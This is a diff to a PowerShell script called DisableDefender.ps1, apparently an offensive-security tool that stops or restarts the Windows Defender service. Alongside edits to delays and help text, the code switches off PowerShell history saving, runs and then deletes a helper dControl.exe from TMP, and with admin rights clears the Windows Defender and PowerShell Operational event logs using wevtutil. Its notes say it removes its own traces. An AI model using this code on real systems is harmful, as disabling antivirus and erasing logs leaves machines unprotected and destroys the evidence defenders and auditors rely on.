@@ -19,11 +19,11 @@
 .Parameter Action
    Accepts arguments: Query, Stop, Start (default: Query)
 
+.Parameter ServiceName
+   The Windows Defender Service Name (default: WinDefend)
+
 .Parameter Delay
    Time (sec) to update the service state (default: 4)
-
-.Parameter ServiceName
-   Windows Defender Service Name (default: WinDefend)
 
 .EXAMPLE
    PS C:\> .\DisableDefender.ps1 -Action Query
@@ -38,7 +38,7 @@
    Stops the Windows Defender Service (WinDefend)
 
 .EXAMPLE
-   PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 3
+   PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 7
    Give some time (sec) to update the service state (default: 4)
 
 .INPUTS
@@ -70,7 +70,7 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
 ## Global variable declarations { Cmdlet Internal Settings }
 $Working_Directory = pwd|Select-Object -ExpandProperty Path
 $Patched = (Get-MpComputerStatus -EA SilentlyContinue).AMProductVersion
-If($Delay -lt 3 -or $Delay -gt 6){[int]$Delay='4'} ## min\max delay value accepted
+If($Delay -lt 4 -or $Delay -gt 10){[int]$Delay='4'} ## min\max delay value accepted
 $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 If($IsClientAdmin -eq $True){$ShellPrivs = "Administrator"}Else{$ShellPrivs = "UserLand::EOP"}
 
@@ -93,11 +93,11 @@ If($Action -ieq "Query"){
       PS C:\> .\DisableDefender.ps1 -Action Query
 
    .OUTPUTS
-      Disable Windows Defender Service
-      --------------------------------
+      Query Windows Defender Service
+      ------------------------------
       ServiceName      : WinDefend
       AMRversion       : 4.18.2104.14
-      ShellPrivs       : UserLand::EOP
+      ShellPrivs       : UserLand
       StartType        : Automatic
       CurrentStatus    : Running
       CanStop          : True
@@ -105,6 +105,7 @@ If($Action -ieq "Query"){
 
 
    ## Local function variable declarations
+   $RawPrivs = "$ShellPrivs" -replace '::EOP',''
    $State = Get-Service -Name "$ServiceName" -EA SilentlyContinue
    $stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
    $CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
@@ -115,7 +116,7 @@ If($Action -ieq "Query"){
    Write-Host "------------------------------";Start-Sleep -Seconds 1
    echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
    echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
-   echo "ShellPrivs       : $ShellPrivs" >> $Env:TMP\qwerty.log
+   echo "ShellPrivs       : $RawPrivs" >> $Env:TMP\qwerty.log
    echo "StartType        : $stype" >> $Env:TMP\qwerty.log
    echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
    echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
@@ -144,7 +145,7 @@ If($Action -ieq "Stop"){
       PS C:\> .\DisableDefender.ps1 -Action Stop
 
    .EXAMPLE
-      PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 2
+      PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 7
 
    .OUTPUTS
       Disable Windows Defender Service
@@ -154,7 +155,7 @@ If($Action -ieq "Stop"){
       ShellPrivs       : Administrator
       StartType        : Automatic
       CurrentStatus    : Stopped
-      CanStop          : True
+      CanStop          : False
       Delete logfiles  : Powershell + Windows Defender
    #>
 
@@ -243,7 +244,7 @@ If($Action -ieq "Start"){
       PS C:\> .\DisableDefender.ps1 -Action Start
 
    .EXAMPLE
-      PS C:\> .\DisableDefender.ps1 -Action Start -Delay 2
+      PS C:\> .\DisableDefender.ps1 -Action Start -Delay 7
 
    .OUTPUTS
       Enable Windows Defender Service
@@ -325,8 +326,19 @@ If($Action -ieq "Start"){
 }
 
 
+<#
+.SYNOPSIS
+   Author: @r00t-3xp10it
+   Helper - The Output Table for -Action '<Stop|Start>'
+
+.NOTES
+   This function also deletes all artifacts left behind
+   by tihs cmdlet and logfiles if DisableDefender cmdlet
+   is executed with admin privs (EOP will NOT clean logs).
+#>
+
 ## Local function variable declarations
-Start-Sleep -Seconds $Delay ## Give time to update service state
+Start-Sleep -Seconds 2 ## Give time to update service state
 $stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
 $CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
 $StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop
@@ -341,6 +353,7 @@ If($Action -ieq "Stop"){
 }
 echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
 echo "AMRversion       : $Patched" >> $Env:TMP\qwerty.log
+echo "ShellPrivs       : $ShellPrivs" >> $Env:TMP\qwerty.log
 echo "StartType        : $stype" >> $Env:TMP\qwerty.log
 echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
 echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
@@ -366,10 +379,10 @@ If(Test-Path -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue){Start-Sleep -Se
    Remove-Item -Path "$Env:TMP\dControl.exe" -EA SilentlyContinue -Force
 }
 
-## Delete Windows-Defender logfiles
-If($IsClientAdmin -eq $True){
-   wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+
+If($IsClientAdmin -eq $True){## Delete Powershell-Defender logs
    wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
+   wevtutil cl "Microsoft-Windows-PowerShell/Operational"
 }
 
 exit
